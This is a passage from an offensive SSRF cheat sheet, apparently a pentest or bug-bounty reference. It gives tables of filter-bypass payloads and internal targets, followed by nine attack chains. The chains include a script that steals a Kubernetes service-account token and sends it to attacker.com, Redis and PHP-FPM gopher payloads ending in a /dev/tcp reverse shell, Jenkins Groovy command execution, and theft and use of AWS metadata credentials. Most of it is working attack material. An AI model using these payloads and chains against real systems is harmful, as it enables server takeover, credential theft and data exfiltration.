| Follows allowlisted redirects | Open redirect on trusted domain → internal | Redirect chain |
| Follows redirects but checks method | 307/308 redirect to preserve POST + body | r3dir.me for hosted redirect |
| PHP `filter_var()` | `http://test???test.com@127.0.0.1/` | Malformed URL quirk |
| Java environment | `jar:http://127.0.0.1!/` or `netdoc:///etc/passwd` | JVM-specific schemes |
| TCP egress filter | `tftp://attacker.com:69/` | UDP bypasses TCP-only filters |
| DNS-only (HTTP blocked) | DNS callback with OOB tool | Confirm SSRF exists, then chain |
| IMDSv2 required | gopher:// with PUT headers or redirect chain | Multi-step token fetch |
| String blocklist (no DNS check) | `127.0.0.1.nip.io` or `127.0.0.1.sslip.io` | Domain resolves to blocked IP |
| Hostname string compare | `http://%6c%6f%63%61%6c%68%6f%73%74/` | URL-encode hostname before compare |
| Multi-library parsing | `http://127.1.1.1:80\@127.2.2.2:80/` | Backslash @ discrepancy |
| XML/XSLT processing | `document('http://169.254.169.254/')` in XSLT | Processor fetches at transform time |

---

## High-Value Targets

| Target Stack / Feature | Why High Value | Impact |
|-----------------------|----------------|--------|
| PDF generators (wkhtmltopdf, Puppeteer, headless Chrome) | Render user HTML server-side | SSRF → IMDS → AWS creds |
| Image thumbnail / resize service | Fetches remote URL before processing | Internal port scan + metadata |
| Webhook configuration (any SaaS) | User-controlled outbound URL | SSRF → internal pivot |
| OAuth metadata URL (`jwks_uri`, `redirect_uri`, `request_uri`) | Server fetches to validate token issuer | SSRF to IMDS or internal APIs |
| Import-from-URL (Notion, Confluence, etc.) | Proxies external content | SSRF to internal APIs |
| XSLT / XSL transformation endpoint | `document()` fetches URLs at transform time | Blind SSRF from data pipeline |
| Kubernetes API server at `10.96.0.1` | Cluster-internal API, often unauthenticated | List secrets → all pod credentials |
| Redis at `127.0.0.1:6379` | Unauthenticated by default | gopher RCE → shell |
| PHP-FPM FastCGI at `127.0.0.1:9000` | No auth, accepts env var injection | gopher → PHP RCE |
| Spring Boot Actuator `/actuator/env` | Exposes env vars + allows config injection | RCE via spring.cloud config |
| ECS `169.254.170.2` credentials | Per-task IAM credentials | AWS pivot from container |
| EKS `169.254.170.23` Pod Identity | Node/pod-level IAM credentials | AWS EC2 + ECR pivot |
| Docker daemon `127.0.0.1:2375` | Unauthenticated container API | Privileged container → host RCE |
| Confluence `iconUriServlet` (CVE-2017-9506) | Acts as open HTTP proxy | SSRF to internal metadata |
| Jira `makeRequest` servlet (CVE-2019-8451) | Unauthenticated in affected versions | SSRF to internal APIs |
| WebLogic UDDI Explorer (CVE-2014-4210) | Server-side request with user URL | SSRF → internal port scan |
| Apache Solr `shards` param | Distributed search fetches remote shards | SSRF → internal data exfil |
| SVG upload / avatar / attachment | ImageMagick resolves `href` server-side | Blind SSRF + XSS if browser-rendered |

---

## Real-World Chains

### Chain 1: Webhook SSRF → IMDSv1 → S3 Data Exfil

```
1. App allows user to configure webhook URL
2. Set webhook URL to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Trigger the webhook (submit a form, create a resource, etc.)
4. Response contains role name → fetch credentials:
   http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-ROLE-NAME
5. Exfil: AccessKeyId + SecretAccessKey + SessionToken
6. Configure AWS CLI → aws s3 ls → dump all S3 buckets
7. aws secretsmanager list-secrets → dump RDS passwords, API keys, etc.

Impact: Critical — full AWS account access
Real example: Capital One breach (2019), GitLab HackerOne report #1116226
```

### Chain 2: PDF Generator SSRF → K8s Service Account → Cluster Takeover

```
1. App has HTML-to-PDF feature (report generation, invoice download)
2. Inject iframe or fetch in HTML template:
   <script>
   fetch('file:///var/run/secrets/kubernetes.io/serviceaccount/token')
     .then(r=>r.text())
     .then(t=>fetch('https://attacker.com/token?t='+t))
   </script>
3. PDF service renders HTML in headless browser inside K8s pod
4. Service account token exfilled to attacker
5. Use token with K8s API:
   curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets
6. List all secrets in all namespaces → DB passwords, API keys, other service account tokens

Impact: Critical — full K8s cluster secret access
```

### Chain 3: SSRF → Redis Gopher → RCE → Reverse Shell

```
1. Find SSRF in imageUrl parameter
2. Confirm Redis at 127.0.0.1:6379 via dict://127.0.0.1:6379/info (check INFO response)
3. Generate cron-based reverse shell via Gopherus:
   python3 gopherus.py --exploit redis
   → select cronjob → enter reverse shell → copy gopher:// payload
4. Send via SSRF:
   imageUrl=gopher://127.0.0.1:6379/_%2A...ENCODED-CRON-PAYLOAD...
5. Cron executes → reverse shell on port 4444

Impact: Critical — RCE on server
```

### Chain 4: Blind SSRF → Internal Jenkins → Groovy RCE

```
1. Blind SSRF confirmed via OOB DNS callback
2. Port scan internal range: try 127.0.0.1:8080 — check error vs timeout
3. Fetch http://127.0.0.1:8080/script → Jenkins script console (often unauthenticated internally)
4. POST to /script:
   script=def+cmd="id".execute();def+out=new+StringBuffer();
   cmd.consumeProcessOutputStream(out);cmd.waitFor();println(out)
5. Response contains command output

Impact: Critical — RCE via internal Jenkins
```

### Chain 5: SSRF → ECS Task Credentials → Cross-Account Pivot

```
1. SSRF in containerized app (ECS Fargate)
2. Fetch: http://169.254.170.2/v2/metadata → extract CredentialsRelativeUri
3. Fetch: http://169.254.170.2/v2/credentials/<ID> → AWS temp creds
4. Assume role with trust policy:
   aws sts assume-role --role-arn arn:aws:iam::OTHER-ACCOUNT:role/admin --role-session-name pwned
5. Pivot to a different AWS account in the organization

Impact: Critical — cross-account AWS access
```

### Chain 6: OAuth jwks_uri SSRF → IMDS → Token Forgery

```
1. App implements custom OAuth AS that accepts dynamic client registration
2. Register a client with jwks_uri pointing to IMDS:
   POST /oauth/register
   {"client_name":"evil","jwks_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
3. AS fetches jwks_uri to cache public keys → SSRF triggered
4. Response body (IAM credentials) returned in error message or logs
5. Use stolen credentials → AWS CLI → enumerate secrets
6. Optional: forge JWTs signed with HMAC using stolen secret if AS falls back to symmetric

Impact: Critical — IAM credential theft via OAuth registration endpoint
Stack: Keycloak, custom OAuth2 implementations, Identity Server
```

### Chain 7: XSLT Template Injection → Internal API Read

```
1. App accepts user-uploaded XSLT templates for report generation
2. Craft malicious XSLT:
   <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
3. Upload via report template feature
4. Trigger report generation
5. XSLT processor (Saxon/Xalan) fetches IMDS → response embedded in output XML
6. Parse rendered report for IAM credentials

Impact: Critical — credential theft via document processing pipeline
Stack: Java (Saxon, Xalan), PHP (XSLTProcessor), .NET (XslCompiledTransform)
```

### Chain 8: SSRF → FastCGI → PHP RCE → Reverse Shell

```
1. Find SSRF in imageUrl or similar parameter
2. Confirm PHP-FPM at 127.0.0.1:9000 (check error vs timeout behavior)
3. Find a PHP file on disk (check /index.php, /var/www/html/index.php via error messages)
4. Generate FastCGI payload with Gopherus:
   python3 gopherus.py --exploit fastcgi
   → PHP file: /var/www/html/index.php
   → Command: bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
5. Send gopher:// payload via SSRF parameter
6. PHP-FPM executes command → reverse shell connects back

Impact: Critical — RCE on server running PHP-FPM
Stack: nginx + PHP-FPM (extremely common)
```

### Chain 9: nip.io Bypass → IMDS → S3 Bucket Takeover

```
1. App validates URL: blocks "169.254.169.254" as string, blocks "127.0.0.1"
2. App does NOT resolve the hostname before comparing against blocklist
3. Use nip.io bypass:
   url=http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/
4. String check passes (no blocked strings found)
5. Server resolves 169.254.169.254.nip.io → 169.254.169.254
6. IMDS responds with IAM role name
7. Fetch: http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/<ROLE>
8. Extract AccessKeyId + SecretAccessKey + Token → aws s3 ls --all-buckets

Impact: Critical — filter bypass + full IMDS access
```
